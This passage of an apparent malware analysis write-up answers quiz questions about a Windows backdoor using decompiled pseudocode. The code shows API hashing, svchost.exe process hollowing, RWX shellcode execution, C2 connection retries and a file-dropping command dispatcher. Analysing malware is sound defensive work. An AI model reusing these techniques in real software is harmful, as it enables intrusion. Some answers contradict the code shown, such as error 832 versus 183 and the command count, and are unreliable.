      ((void (__fastcall *)(__int64, __int64, _QWORD, int *, _QWORD))kernel32_ReadFile)(
        v11,
        v25,
        (unsigned int)v22,
        &v30,
        0);
      kernel32_CloseHandle = FindModuleByHash(0x4D070222);
      ((void (__fastcall *)(__int64))kernel32_CloseHandle)(v11);
      v28 = v31;
      kernel32_Wow64RevertWow64FsRedirection_1 = FindModuleByHash(0xDE717EF7);
      ((void (__fastcall *)(__int64))kernel32_Wow64RevertWow64FsRedirection_1)(v28);
      return v25;
    }
    else
    {
      v17 = v31;
      kernel32_Wow64RevertWow64FsRedirection_2 = FindModuleByHash(0xDE717EF7);
      ((void (__fastcall *)(__int64))kernel32_Wow64RevertWow64FsRedirection_2)(v17);
      kernel32_CloseHandle_1 = FindModuleByHash(1292304930);
      ((void (__fastcall *)(__int64))kernel32_CloseHandle_1)(v11);
      return 0;
    }
  }
}
```
- The malware reads the file svchost.exe (located at `C:\Windows\System32\svchost.exe`) for process hollowing purposes. This is evident from the sub_7FF88D683D70 function, which constructs the full path to svchost.exe using GetSystemDirectoryA and lstrcatA, opens it with CreateFileA, reads its contents into a buffer with ReadFile, and returns the buffer (along with the file size).

**svchost.exe**

## 15. What hash value is compared to find HeapAlloc (0x00000000)?
```bash
kernel32_RltAllocateHeap_2 = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6810B0();
```
```bash
while ( *v7 );
          if ( v6 == 0x278E4F75 )
            break;
```
## 16. What file name is appended to Windows directory?
```bash
kernel32_GetWindowsDirectoryA = FindModuleByHash(-269553599);
  ((void (__fastcall *)(__int64, __int64))kernel32_GetWindowsDirectoryA)(v19, 260);
  v21 = a1[16];
  strcpy(v57, "\\Temp\\auk.exe");
```

**auk.exe**

## 17. What buffer size is used for hostname?
```bash
ws2_32_gethostname = (unsigned int (__fastcall *)(_BYTE *, __int64))sub_7FF88D681850(2026671679);
if ( ws2_32_gethostname(v58, 256) != -1 )
{
  ws2_32_gethostbyname = (__int64 (__fastcall *)(_BYTE *))sub_7FF88D681850(3286108250LL);
  v37 = ws2_32_gethostbyname(v58);
  // ... further processing
}
```

**256**

## 18. What protection flag is set for shellcode execution?
- both command 0x06 and 0x07 for execute shellcode provide 0x40 as PAGE_EXECUTE_READWRITE to execute shellcode
```bash
kernel32_VirtualProtect = FindModuleByHash(2011822024);
((void (__fastcall *)(void (__fastcall *)(__int64 *), __int64, __int64, char *))kernel32_VirtualProtect)(
  v60,
  v59,
  64,  // ← PAGE_EXECUTE_READWRITE
  v62);
```

**64**

## 19. What debug string indicates receive failure?
```bash
strcpy(v148, "Recv  failed");
```

**Recv failed**

## 20. How many times is socket created on connection failure?
- it will attempt to create socket 3 times if connection failure
```bash
__int64 __fastcall check_conection_to_server(__int64 a1)
{
  __int64 (__fastcall *ws2_32_socket)(__int64, __int64, __int64); // rax
  __int64 v3; // rax
  __int64 v4; // rcx
  __int64 v5; // rbx
  void (__fastcall *ws2_32_closesocket)(__int64); // rax
  __int64 (__fastcall *ws2_32_socket_1)(__int64, __int64, __int64); // rax
  __int64 v8; // rax
  __int64 v9; // rcx
  __int64 v10; // rbx
  void (__fastcall *ws2_32_closesocket_1)(__int64); // rax
  __int64 (__fastcall *ws2_32_socket_2)(__int64, __int64, __int64); // rax
  __int64 v13; // rax
  struct _LIST_ENTRY *kernel32_OutputDebugStringA; // rax
  void (__fastcall *msvcrt_memset)(_BYTE *, _QWORD, __int64); // rax
  __int64 v17; // rcx
  void (__fastcall *v18)(_BYTE *, char *, __int64, _QWORD); // rax
  struct _LIST_ENTRY *kernel32_OutputDebugStringA_1; // rax
  __int64 v20; // rcx
  char v21[8]; // [rsp+20h] [rbp-E0h] BYREF
  char v22[24]; // [rsp+28h] [rbp-D8h] BYREF
  _BYTE v23[272]; // [rsp+40h] [rbp-C0h] BYREF

  ws2_32_socket = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D681850(340917865);
  v3 = ws2_32_socket(2, 1, 6);
  *(_QWORD *)(a1 + 88) = v3;
  if ( v3 == -1 )
    return 0;
  if ( (unsigned int)get_hostname_to_ip(v4, *(_QWORD *)(a1 + 40) + 48LL) != 1
    || (unsigned int)connect_to_server(
                       a1,
                       *(_QWORD *)(a1 + 40) + 48LL,
                       *(unsigned __int16 *)(*(_QWORD *)(a1 + 40) + 36LL)) != 1 )
  {
    v5 = *(_QWORD *)(a1 + 88);
    ws2_32_closesocket = (void (__fastcall *)(__int64))sub_7FF88D681850(1575151903);
    ws2_32_closesocket(v5);
    ws2_32_socket_1 = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D681850(340917865);
    v8 = ws2_32_socket_1(2, 1, 6);
    *(_QWORD *)(a1 + 88) = v8;
    if ( v8 == -1 )
      return 0;
    if ( (unsigned int)get_hostname_to_ip(v9, *(_QWORD *)(a1 + 40) + 88LL) != 1
      || (unsigned int)connect_to_server(
                         a1,
                         *(_QWORD *)(a1 + 40) + 88LL,
                         *(unsigned __int16 *)(*(_QWORD *)(a1 + 40) + 38LL)) != 1 )
    {
      v10 = *(_QWORD *)(a1 + 88);
      ws2_32_closesocket_1 = (void (__fastcall *)(__int64))sub_7FF88D681850(1575151903);
      ws2_32_closesocket_1(v10);
      ws2_32_socket_2 = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D681850(340917865);
      v13 = ws2_32_socket_2(2, 1, 6);
      *(_QWORD *)(a1 + 88) = v13;
      if ( v13 == -1 )
      {
        strcpy(v22, "Socket failed");
        kernel32_OutputDebugStringA = FindModuleByHash(449530704);
        ((void (__fastcall *)(char *))kernel32_OutputDebugStringA)(v22);
        return 0;
      }
      msvcrt_memset = (void (__fastcall *)(_BYTE *, _QWORD, __int64))sub_7FF88D6812D0(94614379);
      msvcrt_memset(v23, 0, 260);
      strcpy(v21, "%s:%d");
      v18 = (void (__fastcall *)(_BYTE *, char *, __int64, _QWORD))sub_7FF88D681160(v17);
      v18(v23, v21, *(_QWORD *)(a1 + 40) + 128LL, *(unsigned __int16 *)(*(_QWORD *)(a1 + 40) + 6LL));
      kernel32_OutputDebugStringA_1 = FindModuleByHash(449530704);
      ((void (__fastcall *)(_BYTE *))kernel32_OutputDebugStringA_1)(v23);
      if ( (unsigned int)get_hostname_to_ip(v20, *(_QWORD *)(a1 + 40) + 128LL) != 1
        || (unsigned int)connect_to_server(
                           a1,
                           *(_QWORD *)(a1 + 40) + 128LL,
                           *(unsigned __int16 *)(*(_QWORD *)(a1 + 40) + 6LL)) != 1 )
      {
        return 0;
      }
    }
  }
  return 1;
}
```

**3**

## 21. What mutex prevents multiple instances?
```bash
if ( !*(_BYTE *)(a2 + 27)
        || (strcpy(
              v147,
              "V4.0"),                                // = 0x0
            kernel32_CreateMutexA = FindModuleByHash(385772936),
            *(_QWORD *)(a1 + 16) = ((__int64 (__fastcall *)(_QWORD, _QWORD, char *))kernel32_CreateMutexA)(0, 0, v147),
            v5 = (unsigned int (*)(void))FindModuleByHash(-941611426),
            v5() != 183) )
      {
```
- it check whether mutex "V4.0" existed or not, if not, create a new one

**V4.0**

## 22. What Win32 error type name indicates mutex exists (string)?
```bash
if ( !*(_BYTE *)(a2 + 27)
        || (strcpy(
              v147,
              "V4.0"),                                // = 0x0
            kernel32_CreateMutexA = FindModuleByHash(385772936),
            *(_QWORD *)(a1 + 16) = ((__int64 (__fastcall *)(_QWORD, _QWORD, char *))kernel32_CreateMutexA)(0, 0, v147),
            kernel32_GetLastError = (unsigned int (*)(void))FindModuleByHash(0xC7E0265E),
            kernel32_GetLastError() != 183) )
```
- the error code 832 corresponds to `ERROR_ALREADY_EXISTS`

**ERROR_ALREADY_EXISTS**

## 23. what is the address of the function convert hostname to IP (0x00000000)?

**0x1800035f0**

## 24. How many commands are handled in malware command dispatch?
```bash
v49 = *(_DWORD *)(v41 + 8);
if ( v49 <= 0xF )
{
  // ... Command handling for v49 <= 15
}
switch ( v49 )
{
  case 7u:
    // Execute buffer with flag v139 = 1
    break;
  case 8u:
    // Load new module into memory
    break;
  case 9u:
    // Allocate function pointer arrays
    break;
  case 3u:
    // Sleep or terminate
    break;
  case 4u:
    // Execute and free buffer
    break;
  case 0xEu:
    // Terminate immediately
    break;
  case 0xBu:
    // Execute C2 payload (drop and run file)
    break;
  case 0xDu:
    // Write to file
    break;
  case 0xCu:
    // Check admin status and process exit code
    break;
}
```

**15**

## 25. What is the hash multiplier constant used in malware hash algorithm?
```bash
if ( v6 )
    {
      while ( 1 )
      {
        hash = 0;
        v9 = (char *)v3 + *v7;
        for ( i = *v9; *v9; i = *v9 )
        {
          ++v9;
          hash = i + 33 * hash;
        }
        if ( hash == module_hash )
          break;
        ++v7;
        if ( ++v4 >= v6 )
          return 0;
      }
      return (struct _LIST_ENTRY *)((char *)v3
                                  + *(unsigned int *)((char *)&v3->Flink
                                                    + 4
                                                    * *(unsigned __int16 *)((char *)&v3->Flink
                                                                          + 2 * v4
                                                                          + (unsigned int)IMAGE_NT_HEADERS[9])
                                                    + (unsigned int)IMAGE_NT_HEADERS[7]));
    }
    else
    {
      return 0;
    }
```

**33**

## 26. What is the total configuration buffer size (bytes) on the function that setup the configuration of the malware?
- The `InitNetworkAndSystemData` function is responsible for initializing the malware’s configuration, and it allocates a buffer for system and network data, which is stored in the configuration structure pointed to by a1. The relevant code is
```bash
kernel32_GetProcessHeap_3 = (__int64 (*)(void))FindModuleByHash(-1175317699);
v26 = kernel32_GetProcessHeap_3();
ntdll_RtlAllocateHeap_3 = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6810B0();
v28 = ntdll_RtlAllocateHeap_3(v26, 8, 632);
*a1 = v28;
v29 = v28;
msvcrt_memset = (void (__fastcall *)(__int64, _QWORD, __int64))sub_7FF88D6812D0(94614379);
msvcrt_memset(v29, 0, 632);
v31 = *a1;
a1[10] = *a1;
```
The buffer is used to store system information:
- Computer Name: kernel32_GetComputerNameA writes to v31 + 16 (offset 16 in the buffer).
- User Name: advapi32_GetUserNameA_1 writes to v33 + 276 (offset 276 in the buffer).
- IP Address: The resolved IP address (from ws2_32_gethostbyname and ws2_32_inet_ntoa) is written to v47 + 536 (offset 536 in the buffer).
- Version String: A hardcoded value 0x312E3156 ("1.1" in ASCII) is written to v50 + 600 (offset 600 in the buffer).
The buffer’s size accommodates these fields, with offsets up to 600 + 4 = 604 bytes, plus potential padding or additional metadata, totaling 632 bytes.

**632**

## 27. What is the socket protocol (integer) used for TCP connections?
```bash
ws2_32_socket = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D681850(340917865);
  v3 = ws2_32_socket(2, 1, 6);
```
- this will create a socket with AF_INET, and IPPROTO_TCP

**6**